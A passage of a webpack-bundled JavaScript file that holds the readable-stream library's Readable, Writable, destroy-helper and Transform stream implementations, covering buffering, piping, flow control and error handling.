                (Readable.prototype._undestroy = destroyImpl.undestroy),
                (Readable.prototype._destroy = function (err, cb) {
                    cb(err);
                }),
                (Readable.prototype.push = function (chunk, encoding) {
                    var skipChunkCheck,
                        state = this._readableState;
                    return (
                        state.objectMode
                            ? (skipChunkCheck = !0)
                            : "string" == typeof chunk && ((encoding = encoding || state.defaultEncoding) !== state.encoding && ((chunk = Buffer.from(chunk, encoding)), (encoding = "")), (skipChunkCheck = !0)),
                        readableAddChunk(this, chunk, encoding, !1, skipChunkCheck)
                    );
                }),
                (Readable.prototype.unshift = function (chunk) {
                    return readableAddChunk(this, chunk, null, !0, !1);
                }),
                (Readable.prototype.isPaused = function () {
                    return !1 === this._readableState.flowing;
                }),
                (Readable.prototype.setEncoding = function (enc) {
                    StringDecoder || (StringDecoder = __webpack_require__(21).StringDecoder);
                    var decoder = new StringDecoder(enc);
                    (this._readableState.decoder = decoder), (this._readableState.encoding = this._readableState.decoder.encoding);
                    for (var p = this._readableState.buffer.head, content = ""; null !== p; ) (content += decoder.write(p.data)), (p = p.next);
                    return this._readableState.buffer.clear(), "" !== content && this._readableState.buffer.push(content), (this._readableState.length = content.length), this;
                });
            function howMuchToRead(n, state) {
                return n <= 0 || (0 === state.length && state.ended)
                    ? 0
                    : state.objectMode
                    ? 1
                    : n != n
                    ? state.flowing && state.length
                        ? state.buffer.head.data.length
                        : state.length
                    : (n > state.highWaterMark &&
                          (state.highWaterMark = (function (n) {
                              return n >= 1073741824 ? (n = 1073741824) : (n--, (n |= n >>> 1), (n |= n >>> 2), (n |= n >>> 4), (n |= n >>> 8), (n |= n >>> 16), n++), n;
                          })(n)),
                      n <= state.length ? n : state.ended ? state.length : ((state.needReadable = !0), 0));
            }
            function emitReadable(stream) {
                var state = stream._readableState;
                debug("emitReadable", state.needReadable, state.emittedReadable),
                    (state.needReadable = !1),
                    state.emittedReadable || (debug("emitReadable", state.flowing), (state.emittedReadable = !0), process.nextTick(emitReadable_, stream));
            }
            function emitReadable_(stream) {
                var state = stream._readableState;
                debug("emitReadable_", state.destroyed, state.length, state.ended),
                    state.destroyed || (!state.length && !state.ended) || (stream.emit("readable"), (state.emittedReadable = !1)),
                    (state.needReadable = !state.flowing && !state.ended && state.length <= state.highWaterMark),
                    flow(stream);
            }
            function maybeReadMore(stream, state) {
                state.readingMore || ((state.readingMore = !0), process.nextTick(maybeReadMore_, stream, state));
            }
            function maybeReadMore_(stream, state) {
                for (; !state.reading && !state.ended && (state.length < state.highWaterMark || (state.flowing && 0 === state.length)); ) {
                    var len = state.length;
                    if ((debug("maybeReadMore read 0"), stream.read(0), len === state.length)) break;
                }
                state.readingMore = !1;
            }
            function updateReadableListening(self) {
                var state = self._readableState;
                (state.readableListening = self.listenerCount("readable") > 0), state.resumeScheduled && !state.paused ? (state.flowing = !0) : self.listenerCount("data") > 0 && self.resume();
            }
            function nReadingNextTick(self) {
                debug("readable nexttick read 0"), self.read(0);
            }
            function resume_(stream, state) {
                debug("resume", state.reading), state.reading || stream.read(0), (state.resumeScheduled = !1), stream.emit("resume"), flow(stream), state.flowing && !state.reading && stream.read(0);
            }
            function flow(stream) {
                var state = stream._readableState;
                for (debug("flow", state.flowing); state.flowing && null !== stream.read(); );
            }
            function fromList(n, state) {
                return 0 === state.length
                    ? null
                    : (state.objectMode
                          ? (ret = state.buffer.shift())
                          : !n || n >= state.length
                          ? ((ret = state.decoder ? state.buffer.join("") : 1 === state.buffer.length ? state.buffer.first() : state.buffer.concat(state.length)), state.buffer.clear())
                          : (ret = state.buffer.consume(n, state.decoder)),
                      ret);
                var ret;
            }
            function endReadable(stream) {
                var state = stream._readableState;
                debug("endReadable", state.endEmitted), state.endEmitted || ((state.ended = !0), process.nextTick(endReadableNT, state, stream));
            }
            function endReadableNT(state, stream) {
                if ((debug("endReadableNT", state.endEmitted, state.length), !state.endEmitted && 0 === state.length && ((state.endEmitted = !0), (stream.readable = !1), stream.emit("end"), state.autoDestroy))) {
                    var wState = stream._writableState;
                    (!wState || (wState.autoDestroy && wState.finished)) && stream.destroy();
                }
            }
            function indexOf(xs, x) {
                for (var i = 0, l = xs.length; i < l; i++) if (xs[i] === x) return i;
                return -1;
            }
            (Readable.prototype.read = function (n) {
                debug("read", n), (n = parseInt(n, 10));
                var state = this._readableState,
                    nOrig = n;
                if ((0 !== n && (state.emittedReadable = !1), 0 === n && state.needReadable && ((0 !== state.highWaterMark ? state.length >= state.highWaterMark : state.length > 0) || state.ended)))
                    return debug("read: emitReadable", state.length, state.ended), 0 === state.length && state.ended ? endReadable(this) : emitReadable(this), null;
                if (0 === (n = howMuchToRead(n, state)) && state.ended) return 0 === state.length && endReadable(this), null;
                var ret,
                    doRead = state.needReadable;
                return (
                    debug("need readable", doRead),
                    (0 === state.length || state.length - n < state.highWaterMark) && debug("length less than watermark", (doRead = !0)),
                    state.ended || state.reading
                        ? debug("reading or ended", (doRead = !1))
                        : doRead &&
                          (debug("do read"), (state.reading = !0), (state.sync = !0), 0 === state.length && (state.needReadable = !0), this._read(state.highWaterMark), (state.sync = !1), state.reading || (n = howMuchToRead(nOrig, state))),
                    null === (ret = n > 0 ? fromList(n, state) : null) ? ((state.needReadable = state.length <= state.highWaterMark), (n = 0)) : ((state.length -= n), (state.awaitDrain = 0)),
                    0 === state.length && (state.ended || (state.needReadable = !0), nOrig !== n && state.ended && endReadable(this)),
                    null !== ret && this.emit("data", ret),
                    ret
                );
            }),
                (Readable.prototype._read = function (n) {
                    errorOrDestroy(this, new ERR_METHOD_NOT_IMPLEMENTED("_read()"));
                }),
                (Readable.prototype.pipe = function (dest, pipeOpts) {
                    var src = this,
                        state = this._readableState;
                    switch (state.pipesCount) {
                        case 0:
                            state.pipes = dest;
                            break;
                        case 1:
                            state.pipes = [state.pipes, dest];
                            break;
                        default:
                            state.pipes.push(dest);
                    }
                    (state.pipesCount += 1), debug("pipe count=%d opts=%j", state.pipesCount, pipeOpts);
                    var endFn = (!pipeOpts || !1 !== pipeOpts.end) && dest !== process.stdout && dest !== process.stderr ? onend : unpipe;
                    function onunpipe(readable, unpipeInfo) {
                        debug("onunpipe"),
                            readable === src &&
                                unpipeInfo &&
                                !1 === unpipeInfo.hasUnpiped &&
                                ((unpipeInfo.hasUnpiped = !0),
                                debug("cleanup"),
                                dest.removeListener("close", onclose),
                                dest.removeListener("finish", onfinish),
                                dest.removeListener("drain", ondrain),
                                dest.removeListener("error", onerror),
                                dest.removeListener("unpipe", onunpipe),
                                src.removeListener("end", onend),
                                src.removeListener("end", unpipe),
                                src.removeListener("data", ondata),
                                (cleanedUp = !0),
                                !state.awaitDrain || (dest._writableState && !dest._writableState.needDrain) || ondrain());
                    }
                    function onend() {
                        debug("onend"), dest.end();
                    }
                    state.endEmitted ? process.nextTick(endFn) : src.once("end", endFn), dest.on("unpipe", onunpipe);
                    var ondrain = (function (src) {
                        return function () {
                            var state = src._readableState;
                            debug("pipeOnDrain", state.awaitDrain), state.awaitDrain && state.awaitDrain--, 0 === state.awaitDrain && EElistenerCount(src, "data") && ((state.flowing = !0), flow(src));
                        };
                    })(src);
                    dest.on("drain", ondrain);
                    var cleanedUp = !1;
                    function ondata(chunk) {
                        debug("ondata");
                        var ret = dest.write(chunk);
                        debug("dest.write", ret),
                            !1 === ret &&
                                (((1 === state.pipesCount && state.pipes === dest) || (state.pipesCount > 1 && -1 !== indexOf(state.pipes, dest))) &&
                                    !cleanedUp &&
                                    (debug("false write response, pause", state.awaitDrain), state.awaitDrain++),
                                src.pause());
                    }
                    function onerror(er) {
                        debug("onerror", er), unpipe(), dest.removeListener("error", onerror), 0 === EElistenerCount(dest, "error") && errorOrDestroy(dest, er);
                    }
                    function onclose() {
                        dest.removeListener("finish", onfinish), unpipe();
                    }
                    function onfinish() {
                        debug("onfinish"), dest.removeListener("close", onclose), unpipe();
                    }
                    function unpipe() {
                        debug("unpipe"), src.unpipe(dest);
                    }
                    return (
                        src.on("data", ondata),
                        (function (emitter, event, fn) {
                            if ("function" == typeof emitter.prependListener) return emitter.prependListener(event, fn);
                            emitter._events && emitter._events[event] ? (Array.isArray(emitter._events[event]) ? emitter._events[event].unshift(fn) : (emitter._events[event] = [fn, emitter._events[event]])) : emitter.on(event, fn);
                        })(dest, "error", onerror),
                        dest.once("close", onclose),
                        dest.once("finish", onfinish),
                        dest.emit("pipe", src),
                        state.flowing || (debug("pipe resume"), src.resume()),
                        dest
                    );
                }),
                (Readable.prototype.unpipe = function (dest) {
                    var state = this._readableState,
                        unpipeInfo = { hasUnpiped: !1 };
                    if (0 === state.pipesCount) return this;
                    if (1 === state.pipesCount)
                        return (dest && dest !== state.pipes) || (dest || (dest = state.pipes), (state.pipes = null), (state.pipesCount = 0), (state.flowing = !1), dest && dest.emit("unpipe", this, unpipeInfo)), this;
                    if (!dest) {
                        var dests = state.pipes,
                            len = state.pipesCount;
                        (state.pipes = null), (state.pipesCount = 0), (state.flowing = !1);
                        for (var i = 0; i < len; i++) dests[i].emit("unpipe", this, { hasUnpiped: !1 });
                        return this;
                    }
                    var index = indexOf(state.pipes, dest);
                    return -1 === index || (state.pipes.splice(index, 1), (state.pipesCount -= 1), 1 === state.pipesCount && (state.pipes = state.pipes[0]), dest.emit("unpipe", this, unpipeInfo)), this;
                }),
                (Readable.prototype.on = function (ev, fn) {
                    var res = Stream.prototype.on.call(this, ev, fn),
                        state = this._readableState;
                    return (
                        "data" === ev
                            ? ((state.readableListening = this.listenerCount("readable") > 0), !1 !== state.flowing && this.resume())
                            : "readable" === ev &&
                              (state.endEmitted ||
                                  state.readableListening ||
                                  ((state.readableListening = state.needReadable = !0),
                                  (state.flowing = !1),
                                  (state.emittedReadable = !1),
                                  debug("on readable", state.length, state.reading),
                                  state.length ? emitReadable(this) : state.reading || process.nextTick(nReadingNextTick, this))),
                        res
                    );
                }),
                (Readable.prototype.addListener = Readable.prototype.on),
                (Readable.prototype.removeListener = function (ev, fn) {
                    var res = Stream.prototype.removeListener.call(this, ev, fn);
                    return "readable" === ev && process.nextTick(updateReadableListening, this), res;
                }),
                (Readable.prototype.removeAllListeners = function (ev) {
                    var res = Stream.prototype.removeAllListeners.apply(this, arguments);
                    return ("readable" !== ev && void 0 !== ev) || process.nextTick(updateReadableListening, this), res;
                }),
                (Readable.prototype.resume = function () {
                    var state = this._readableState;
                    return (
                        state.flowing ||
                            (debug("resume"),
                            (state.flowing = !state.readableListening),
                            (function (stream, state) {
                                state.resumeScheduled || ((state.resumeScheduled = !0), process.nextTick(resume_, stream, state));
                            })(this, state)),
                        (state.paused = !1),
                        this
                    );
                }),
                (Readable.prototype.pause = function () {
                    return debug("call pause flowing=%j", this._readableState.flowing), !1 !== this._readableState.flowing && (debug("pause"), (this._readableState.flowing = !1), this.emit("pause")), (this._readableState.paused = !0), this;
                }),
                (Readable.prototype.wrap = function (stream) {
                    var _this = this,
                        state = this._readableState,
                        paused = !1;
                    for (var i in (stream.on("end", function () {
                        if ((debug("wrapped end"), state.decoder && !state.ended)) {
                            var chunk = state.decoder.end();
                            chunk && chunk.length && _this.push(chunk);
                        }
                        _this.push(null);
                    }),
                    stream.on("data", function (chunk) {
                        (debug("wrapped data"), state.decoder && (chunk = state.decoder.write(chunk)), state.objectMode && null == chunk) ||
                            ((state.objectMode || (chunk && chunk.length)) && (_this.push(chunk) || ((paused = !0), stream.pause())));
                    }),
                    stream))
                        void 0 === this[i] &&
                            "function" == typeof stream[i] &&
                            (this[i] = (function (method) {
                                return function () {
                                    return stream[method].apply(stream, arguments);
                                };
                            })(i));
                    for (var n = 0; n < kProxyEvents.length; n++) stream.on(kProxyEvents[n], this.emit.bind(this, kProxyEvents[n]));
                    return (
                        (this._read = function (n) {
                            debug("wrapped _read", n), paused && ((paused = !1), stream.resume());
                        }),
                        this
                    );
                }),
                "function" == typeof Symbol &&
                    (Readable.prototype[Symbol.asyncIterator] = function () {
                        return void 0 === createReadableStreamAsyncIterator && (createReadableStreamAsyncIterator = __webpack_require__(196)), createReadableStreamAsyncIterator(this);
                    }),
                Object.defineProperty(Readable.prototype, "readableHighWaterMark", {
                    enumerable: !1,
                    get: function () {
                        return this._readableState.highWaterMark;
                    },
                }),
                Object.defineProperty(Readable.prototype, "readableBuffer", {
                    enumerable: !1,
                    get: function () {
                        return this._readableState && this._readableState.buffer;
                    },
                }),
                Object.defineProperty(Readable.prototype, "readableFlowing", {
                    enumerable: !1,
                    get: function () {
                        return this._readableState.flowing;
                    },
                    set: function (state) {
                        this._readableState && (this._readableState.flowing = state);
                    },
                }),
                (Readable._fromList = fromList),
                Object.defineProperty(Readable.prototype, "readableLength", {
                    enumerable: !1,
                    get: function () {
                        return this._readableState.length;
                    },
                }),
                "function" == typeof Symbol &&
                    (Readable.from = function (iterable, opts) {
                        return void 0 === from && (from = __webpack_require__(197)), from(Readable, iterable, opts);
                    });
        }.call(this, __webpack_require__(8), __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        module.exports = __webpack_require__(20).EventEmitter;
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (process) {
            function emitErrorAndCloseNT(self, err) {
                emitErrorNT(self, err), emitCloseNT(self);
            }
            function emitCloseNT(self) {
                (self._writableState && !self._writableState.emitClose) || (self._readableState && !self._readableState.emitClose) || self.emit("close");
            }
            function emitErrorNT(self, err) {
                self.emit("error", err);
            }
            module.exports = {
                destroy: function (err, cb) {
                    var _this = this,
                        readableDestroyed = this._readableState && this._readableState.destroyed,
                        writableDestroyed = this._writableState && this._writableState.destroyed;
                    return readableDestroyed || writableDestroyed
                        ? (cb ? cb(err) : err && (this._writableState ? this._writableState.errorEmitted || ((this._writableState.errorEmitted = !0), process.nextTick(emitErrorNT, this, err)) : process.nextTick(emitErrorNT, this, err)),
                          this)
                        : (this._readableState && (this._readableState.destroyed = !0),
                          this._writableState && (this._writableState.destroyed = !0),
                          this._destroy(err || null, function (err) {
                              !cb && err
                                  ? _this._writableState
                                      ? _this._writableState.errorEmitted
                                          ? process.nextTick(emitCloseNT, _this)
                                          : ((_this._writableState.errorEmitted = !0), process.nextTick(emitErrorAndCloseNT, _this, err))
                                      : process.nextTick(emitErrorAndCloseNT, _this, err)
                                  : cb
                                  ? (process.nextTick(emitCloseNT, _this), cb(err))
                                  : process.nextTick(emitCloseNT, _this);
                          }),
                          this);
                },
                undestroy: function () {
                    this._readableState && ((this._readableState.destroyed = !1), (this._readableState.reading = !1), (this._readableState.ended = !1), (this._readableState.endEmitted = !1)),
                        this._writableState &&
                            ((this._writableState.destroyed = !1),
                            (this._writableState.ended = !1),
                            (this._writableState.ending = !1),
                            (this._writableState.finalCalled = !1),
                            (this._writableState.prefinished = !1),
                            (this._writableState.finished = !1),
                            (this._writableState.errorEmitted = !1));
                },
                errorOrDestroy: function (stream, err) {
                    var rState = stream._readableState,
                        wState = stream._writableState;
                    (rState && rState.autoDestroy) || (wState && wState.autoDestroy) ? stream.destroy(err) : stream.emit("error", err);
                },
            };
        }.call(this, __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var ERR_INVALID_OPT_VALUE = __webpack_require__(25).codes.ERR_INVALID_OPT_VALUE;
        module.exports = {
            getHighWaterMark: function (state, options, duplexKey, isDuplex) {
                var hwm = (function (options, isDuplex, duplexKey) {
                    return null != options.highWaterMark ? options.highWaterMark : isDuplex ? options[duplexKey] : null;
                })(options, isDuplex, duplexKey);
                if (null != hwm) {
                    if (!isFinite(hwm) || Math.floor(hwm) !== hwm || hwm < 0) throw new ERR_INVALID_OPT_VALUE(isDuplex ? duplexKey : "highWaterMark", hwm);
                    return Math.floor(hwm);
                }
                return state.objectMode ? 16 : 16384;
            },
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (global, process) {
            function CorkedRequest(state) {
                var _this = this;
                (this.next = null),
                    (this.entry = null),
                    (this.finish = function () {
                        !(function (corkReq, state, err) {
                            var entry = corkReq.entry;
                            corkReq.entry = null;
                            for (; entry; ) {
                                var cb = entry.callback;
                                state.pendingcb--, cb(err), (entry = entry.next);
                            }
                            state.corkedRequestsFree.next = corkReq;
                        })(_this, state);
                    });
            }
            var Duplex;
            (module.exports = Writable), (Writable.WritableState = WritableState);
            var internalUtil = { deprecate: __webpack_require__(45) },
                Stream = __webpack_require__(84),
                Buffer = __webpack_require__(6).Buffer,
                OurUint8Array = global.Uint8Array || function () {};
            var realHasInstance,
                destroyImpl = __webpack_require__(85),
                getHighWaterMark = __webpack_require__(86).getHighWaterMark,
                _require$codes = __webpack_require__(25).codes,
                ERR_INVALID_ARG_TYPE = _require$codes.ERR_INVALID_ARG_TYPE,
                ERR_METHOD_NOT_IMPLEMENTED = _require$codes.ERR_METHOD_NOT_IMPLEMENTED,
                ERR_MULTIPLE_CALLBACK = _require$codes.ERR_MULTIPLE_CALLBACK,
                ERR_STREAM_CANNOT_PIPE = _require$codes.ERR_STREAM_CANNOT_PIPE,
                ERR_STREAM_DESTROYED = _require$codes.ERR_STREAM_DESTROYED,
                ERR_STREAM_NULL_VALUES = _require$codes.ERR_STREAM_NULL_VALUES,
                ERR_STREAM_WRITE_AFTER_END = _require$codes.ERR_STREAM_WRITE_AFTER_END,
                ERR_UNKNOWN_ENCODING = _require$codes.ERR_UNKNOWN_ENCODING,
                errorOrDestroy = destroyImpl.errorOrDestroy;
            function nop() {}
            function WritableState(options, stream, isDuplex) {
                (Duplex = Duplex || __webpack_require__(26)),
                    (options = options || {}),
                    "boolean" != typeof isDuplex && (isDuplex = stream instanceof Duplex),
                    (this.objectMode = !!options.objectMode),
                    isDuplex && (this.objectMode = this.objectMode || !!options.writableObjectMode),
                    (this.highWaterMark = getHighWaterMark(this, options, "writableHighWaterMark", isDuplex)),
                    (this.finalCalled = !1),
                    (this.needDrain = !1),
                    (this.ending = !1),
                    (this.ended = !1),
                    (this.finished = !1),
                    (this.destroyed = !1);
                var noDecode = !1 === options.decodeStrings;
                (this.decodeStrings = !noDecode),
                    (this.defaultEncoding = options.defaultEncoding || "utf8"),
                    (this.length = 0),
                    (this.writing = !1),
                    (this.corked = 0),
                    (this.sync = !0),
                    (this.bufferProcessing = !1),
                    (this.onwrite = function (er) {
                        !(function (stream, er) {
                            var state = stream._writableState,
                                sync = state.sync,
                                cb = state.writecb;
                            if ("function" != typeof cb) throw new ERR_MULTIPLE_CALLBACK();
                            if (
                                ((function (state) {
                                    (state.writing = !1), (state.writecb = null), (state.length -= state.writelen), (state.writelen = 0);
                                })(state),
                                er)
                            )
                                !(function (stream, state, sync, er, cb) {
                                    --state.pendingcb,
                                        sync
                                            ? (process.nextTick(cb, er), process.nextTick(finishMaybe, stream, state), (stream._writableState.errorEmitted = !0), errorOrDestroy(stream, er))
                                            : (cb(er), (stream._writableState.errorEmitted = !0), errorOrDestroy(stream, er), finishMaybe(stream, state));
                                })(stream, state, sync, er, cb);
                            else {
                                var finished = needFinish(state) || stream.destroyed;
                                finished || state.corked || state.bufferProcessing || !state.bufferedRequest || clearBuffer(stream, state),
                                    sync ? process.nextTick(afterWrite, stream, state, finished, cb) : afterWrite(stream, state, finished, cb);
                            }
                        })(stream, er);
                    }),
                    (this.writecb = null),
                    (this.writelen = 0),
                    (this.bufferedRequest = null),
                    (this.lastBufferedRequest = null),
                    (this.pendingcb = 0),
                    (this.prefinished = !1),
                    (this.errorEmitted = !1),
                    (this.emitClose = !1 !== options.emitClose),
                    (this.autoDestroy = !!options.autoDestroy),
                    (this.bufferedRequestCount = 0),
                    (this.corkedRequestsFree = new CorkedRequest(this));
            }
            function Writable(options) {
                var isDuplex = this instanceof (Duplex = Duplex || __webpack_require__(26));
                if (!isDuplex && !realHasInstance.call(Writable, this)) return new Writable(options);
                (this._writableState = new WritableState(options, this, isDuplex)),
                    (this.writable = !0),
                    options &&
                        ("function" == typeof options.write && (this._write = options.write),
                        "function" == typeof options.writev && (this._writev = options.writev),
                        "function" == typeof options.destroy && (this._destroy = options.destroy),
                        "function" == typeof options.final && (this._final = options.final)),
                    Stream.call(this);
            }
            function doWrite(stream, state, writev, len, chunk, encoding, cb) {
                (state.writelen = len),
                    (state.writecb = cb),
                    (state.writing = !0),
                    (state.sync = !0),
                    state.destroyed ? state.onwrite(new ERR_STREAM_DESTROYED("write")) : writev ? stream._writev(chunk, state.onwrite) : stream._write(chunk, encoding, state.onwrite),
                    (state.sync = !1);
            }
            function afterWrite(stream, state, finished, cb) {
                finished ||
                    (function (stream, state) {
                        0 === state.length && state.needDrain && ((state.needDrain = !1), stream.emit("drain"));
                    })(stream, state),
                    state.pendingcb--,
                    cb(),
                    finishMaybe(stream, state);
            }
            function clearBuffer(stream, state) {
                state.bufferProcessing = !0;
                var entry = state.bufferedRequest;
                if (stream._writev && entry && entry.next) {
                    var l = state.bufferedRequestCount,
                        buffer = new Array(l),
                        holder = state.corkedRequestsFree;
                    holder.entry = entry;
                    for (var count = 0, allBuffers = !0; entry; ) (buffer[count] = entry), entry.isBuf || (allBuffers = !1), (entry = entry.next), (count += 1);
                    (buffer.allBuffers = allBuffers),
                        doWrite(stream, state, !0, state.length, buffer, "", holder.finish),
                        state.pendingcb++,
                        (state.lastBufferedRequest = null),
                        holder.next ? ((state.corkedRequestsFree = holder.next), (holder.next = null)) : (state.corkedRequestsFree = new CorkedRequest(state)),
                        (state.bufferedRequestCount = 0);
                } else {
                    for (; entry; ) {
                        var chunk = entry.chunk,
                            encoding = entry.encoding,
                            cb = entry.callback;
                        if ((doWrite(stream, state, !1, state.objectMode ? 1 : chunk.length, chunk, encoding, cb), (entry = entry.next), state.bufferedRequestCount--, state.writing)) break;
                    }
                    null === entry && (state.lastBufferedRequest = null);
                }
                (state.bufferedRequest = entry), (state.bufferProcessing = !1);
            }
            function needFinish(state) {
                return state.ending && 0 === state.length && null === state.bufferedRequest && !state.finished && !state.writing;
            }
            function callFinal(stream, state) {
                stream._final(function (err) {
                    state.pendingcb--, err && errorOrDestroy(stream, err), (state.prefinished = !0), stream.emit("prefinish"), finishMaybe(stream, state);
                });
            }
            function finishMaybe(stream, state) {
                var need = needFinish(state);
                if (
                    need &&
                    ((function (stream, state) {
                        state.prefinished ||
                            state.finalCalled ||
                            ("function" != typeof stream._final || state.destroyed ? ((state.prefinished = !0), stream.emit("prefinish")) : (state.pendingcb++, (state.finalCalled = !0), process.nextTick(callFinal, stream, state)));
                    })(stream, state),
                    0 === state.pendingcb && ((state.finished = !0), stream.emit("finish"), state.autoDestroy))
                ) {
                    var rState = stream._readableState;
                    (!rState || (rState.autoDestroy && rState.endEmitted)) && stream.destroy();
                }
                return need;
            }
            __webpack_require__(3)(Writable, Stream),
                (WritableState.prototype.getBuffer = function () {
                    for (var current = this.bufferedRequest, out = []; current; ) out.push(current), (current = current.next);
                    return out;
                }),
                (function () {
                    try {
                        Object.defineProperty(WritableState.prototype, "buffer", {
                            get: internalUtil.deprecate(
                                function () {
                                    return this.getBuffer();
                                },
                                "_writableState.buffer is deprecated. Use _writableState.getBuffer instead.",
                                "DEP0003"
                            ),
                        });
                    } catch (_) {}
                })(),
                "function" == typeof Symbol && Symbol.hasInstance && "function" == typeof Function.prototype[Symbol.hasInstance]
                    ? ((realHasInstance = Function.prototype[Symbol.hasInstance]),
                      Object.defineProperty(Writable, Symbol.hasInstance, {
                          value: function (object) {
                              return !!realHasInstance.call(this, object) || (this === Writable && object && object._writableState instanceof WritableState);
                          },
                      }))
                    : (realHasInstance = function (object) {
                          return object instanceof this;
                      }),
                (Writable.prototype.pipe = function () {
                    errorOrDestroy(this, new ERR_STREAM_CANNOT_PIPE());
                }),
                (Writable.prototype.write = function (chunk, encoding, cb) {
                    var obj,
                        state = this._writableState,
                        ret = !1,
                        isBuf = !state.objectMode && ((obj = chunk), Buffer.isBuffer(obj) || obj instanceof OurUint8Array);
                    return (
                        isBuf &&
                            !Buffer.isBuffer(chunk) &&
                            (chunk = (function (chunk) {
                                return Buffer.from(chunk);
                            })(chunk)),
                        "function" == typeof encoding && ((cb = encoding), (encoding = null)),
                        isBuf ? (encoding = "buffer") : encoding || (encoding = state.defaultEncoding),
                        "function" != typeof cb && (cb = nop),
                        state.ending
                            ? (function (stream, cb) {
                                  var er = new ERR_STREAM_WRITE_AFTER_END();
                                  errorOrDestroy(stream, er), process.nextTick(cb, er);
                              })(this, cb)
                            : (isBuf ||
                                  (function (stream, state, chunk, cb) {
                                      var er;
                                      return (
                                          null === chunk ? (er = new ERR_STREAM_NULL_VALUES()) : "string" == typeof chunk || state.objectMode || (er = new ERR_INVALID_ARG_TYPE("chunk", ["string", "Buffer"], chunk)),
                                          !er || (errorOrDestroy(stream, er), process.nextTick(cb, er), !1)
                                      );
                                  })(this, state, chunk, cb)) &&
                              (state.pendingcb++,
                              (ret = (function (stream, state, isBuf, chunk, encoding, cb) {
                                  if (!isBuf) {
                                      var newChunk = (function (state, chunk, encoding) {
                                          state.objectMode || !1 === state.decodeStrings || "string" != typeof chunk || (chunk = Buffer.from(chunk, encoding));
                                          return chunk;
                                      })(state, chunk, encoding);
                                      chunk !== newChunk && ((isBuf = !0), (encoding = "buffer"), (chunk = newChunk));
                                  }
                                  var len = state.objectMode ? 1 : chunk.length;
                                  state.length += len;
                                  var ret = state.length < state.highWaterMark;
                                  ret || (state.needDrain = !0);
                                  if (state.writing || state.corked) {
                                      var last = state.lastBufferedRequest;
                                      (state.lastBufferedRequest = { chunk: chunk, encoding: encoding, isBuf: isBuf, callback: cb, next: null }),
                                          last ? (last.next = state.lastBufferedRequest) : (state.bufferedRequest = state.lastBufferedRequest),
                                          (state.bufferedRequestCount += 1);
                                  } else doWrite(stream, state, !1, len, chunk, encoding, cb);
                                  return ret;
                              })(this, state, isBuf, chunk, encoding, cb))),
                        ret
                    );
                }),
                (Writable.prototype.cork = function () {
                    this._writableState.corked++;
                }),
                (Writable.prototype.uncork = function () {
                    var state = this._writableState;
                    state.corked && (state.corked--, state.writing || state.corked || state.bufferProcessing || !state.bufferedRequest || clearBuffer(this, state));
                }),
                (Writable.prototype.setDefaultEncoding = function (encoding) {
                    if (
                        ("string" == typeof encoding && (encoding = encoding.toLowerCase()),
                        !(["hex", "utf8", "utf-8", "ascii", "binary", "base64", "ucs2", "ucs-2", "utf16le", "utf-16le", "raw"].indexOf((encoding + "").toLowerCase()) > -1))
                    )
                        throw new ERR_UNKNOWN_ENCODING(encoding);
                    return (this._writableState.defaultEncoding = encoding), this;
                }),
                Object.defineProperty(Writable.prototype, "writableBuffer", {
                    enumerable: !1,
                    get: function () {
                        return this._writableState && this._writableState.getBuffer();
                    },
                }),
                Object.defineProperty(Writable.prototype, "writableHighWaterMark", {
                    enumerable: !1,
                    get: function () {
                        return this._writableState.highWaterMark;
                    },
                }),
                (Writable.prototype._write = function (chunk, encoding, cb) {
                    cb(new ERR_METHOD_NOT_IMPLEMENTED("_write()"));
                }),
                (Writable.prototype._writev = null),
                (Writable.prototype.end = function (chunk, encoding, cb) {
                    var state = this._writableState;
                    return (
                        "function" == typeof chunk ? ((cb = chunk), (chunk = null), (encoding = null)) : "function" == typeof encoding && ((cb = encoding), (encoding = null)),
                        null != chunk && this.write(chunk, encoding),
                        state.corked && ((state.corked = 1), this.uncork()),
                        state.ending ||
                            (function (stream, state, cb) {
                                (state.ending = !0), finishMaybe(stream, state), cb && (state.finished ? process.nextTick(cb) : stream.once("finish", cb));
                                (state.ended = !0), (stream.writable = !1);
                            })(this, state, cb),
                        this
                    );
                }),
                Object.defineProperty(Writable.prototype, "writableLength", {
                    enumerable: !1,
                    get: function () {
                        return this._writableState.length;
                    },
                }),
                Object.defineProperty(Writable.prototype, "destroyed", {
                    enumerable: !1,
                    get: function () {
                        return void 0 !== this._writableState && this._writableState.destroyed;
                    },
                    set: function (value) {
                        this._writableState && (this._writableState.destroyed = value);
                    },
                }),
                (Writable.prototype.destroy = destroyImpl.destroy),
                (Writable.prototype._undestroy = destroyImpl.undestroy),
                (Writable.prototype._destroy = function (err, cb) {
                    cb(err);
                });
        }.call(this, __webpack_require__(8), __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = Transform;
        var _require$codes = __webpack_require__(25).codes,
            ERR_METHOD_NOT_IMPLEMENTED = _require$codes.ERR_METHOD_NOT_IMPLEMENTED,
            ERR_MULTIPLE_CALLBACK = _require$codes.ERR_MULTIPLE_CALLBACK,
            ERR_TRANSFORM_ALREADY_TRANSFORMING = _require$codes.ERR_TRANSFORM_ALREADY_TRANSFORMING,
            ERR_TRANSFORM_WITH_LENGTH_0 = _require$codes.ERR_TRANSFORM_WITH_LENGTH_0,
            Duplex = __webpack_require__(26);
        function afterTransform(er, data) {
            var ts = this._transformState;
            ts.transforming = !1;
            var cb = ts.writecb;
            if (null === cb) return this.emit("error", new ERR_MULTIPLE_CALLBACK());
            (ts.writechunk = null), (ts.writecb = null), null != data && this.push(data), cb(er);
            var rs = this._readableState;
            (rs.reading = !1), (rs.needReadable || rs.length < rs.highWaterMark) && this._read(rs.highWaterMark);
        }
        function Transform(options) {
            if (!(this instanceof Transform)) return new Transform(options);
            Duplex.call(this, options),
                (this._transformState = { afterTransform: afterTransform.bind(this), needTransform: !1, transforming: !1, writecb: null, writechunk: null, writeencoding: null }),
                (this._readableState.needReadable = !0),
                (this._readableState.sync = !1),
                options && ("function" == typeof options.transform && (this._transform = options.transform), "function" == typeof options.flush && (this._flush = options.flush)),
                this.on("prefinish", prefinish);
        }
        function prefinish() {
            var _this = this;
            "function" != typeof this._flush || this._readableState.destroyed
                ? done(this, null, null)
                : this._flush(function (er, data) {
                      done(_this, er, data);
                  });
        }
        function done(stream, er, data) {
            if (er) return stream.emit("error", er);
            if ((null != data && stream.push(data), stream._writableState.length)) throw new ERR_TRANSFORM_WITH_LENGTH_0();
